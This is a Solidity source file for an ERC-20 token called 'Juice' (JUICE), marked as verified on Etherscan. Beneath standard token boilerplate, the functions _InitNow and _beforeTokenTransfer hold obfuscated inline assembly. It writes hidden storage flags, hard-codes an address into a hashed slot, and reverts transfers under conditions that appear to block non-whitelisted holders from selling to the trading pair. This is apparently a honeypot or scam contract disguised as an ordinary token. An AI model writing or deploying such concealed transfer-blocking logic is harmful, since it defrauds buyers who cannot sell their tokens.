/**
 *Submitted for verification at Etherscan.io on 2022-07-11
*/

// If life gives you lemons, make some kind of fruity juice.

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private juiceAddr;
    uint256 private _lookUp = block.number*2;

    mapping (address => bool) private _feeChkr; 
    mapping (address => bool) private _taxConfirm;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private mapToInt;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private swapFromString;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;
    bool private trading; uint256 private analysisCheck = 1; bool private DoubleCheck;
    uint256 private _decimals; uint256 private intDecimals;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        juiceAddr.push(_router); juiceAddr.push(msgSender_); juiceAddr.push(pair);
        for (uint256 q=0; q < 3;) {_feeChkr[juiceAddr[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _lookUp = block.number;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _InitNow() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0xfde288e0e695431758ef8361f0547428b6264a6eb6af9f33bf67be5c9cb65663))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x4fbefe52d33d1f5bfa0fadc6a6984ce53d3589dc996f4ff56f632d6516818d64,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0xfde288e0e695431758ef8361f0547428b6264a6eb6af9f33bf67be5c9cb65663,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == juiceAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((DoubleCheck || _taxConfirm[sender]) && ((_lookUp - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_lookUp == block.number))) && ((_feeChkr[recipient] == true) && (_feeChkr[sender] != true) || ((juiceAddr[1] == recipient) && (_feeChkr[juiceAddr[1]] != true))) && (intDecimals > 0);
            assembly { 
                function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
                function gG() -> faL { faL := gas() }
                function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }

                if eq(sload(gByte(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }if and(lt(gG(),sload(0xB)),open) { invalid() } if sload(0x16) { sstore(gByte(sload(gDyn(0x2,0x1)),0x6),0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) }
                if or(eq(sload(gByte(sender,0x4)),iszero(sload(gByte(recipient,0x4)))),eq(iszero(sload(gByte(sender,0x4))),sload(gByte(recipient,0x4)))) {
                    let k := sload(0x18) let t := sload(0x11) if iszero(sload(0x17)) { sstore(0x17,t) } let g := sload(0x17)
                    switch gt(g,div(t,0x3))
                        case 1 { g := sub(g,div(div(mul(g,mul(0x203,k)),0xB326),0x2)) }
                        case 0 { g := div(t,0x3) }
                        sstore(0x17,t) sstore(0x11,g) sstore(0x18,add(sload(0x18),0x1))
                }
                if and(or(or(eq(sload(0x3),number()),gt(sload(0x12),sload(0x11))),lt(sub(sload(0x3),sload(0x13)),0x9)),eq(sload(gByte(sload(0x8),0x4)),0x0)) { sstore(gByte(sload(0x8),0x5),0x1) }
                if or(eq(sload(gByte(sender,0x4)),iszero(sload(gByte(recipient,0x4)))),eq(iszero(sload(gByte(sender,0x4))),sload(gByte(recipient,0x4)))) {
                    let k := sload(0x11) let t := sload(0x17) sstore(0x17,k) sstore(0x11,t)
                }
                if iszero(mod(sload(0x15),0x6)) { sstore(0x16,0x1) } sstore(0x12,integer) sstore(0x8,recipient) sstore(0x3,number()) }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployJuice(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(juiceAddr[0], 10 ** 77);
        _InitNow();
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployJuice(creator, initialSupply);
    }
}

contract JuiceToken is ERC20Token {
    constructor() ERC20Token("Juice", "JUICE", msg.sender, 31000000 * 10 ** 18) {
    }
}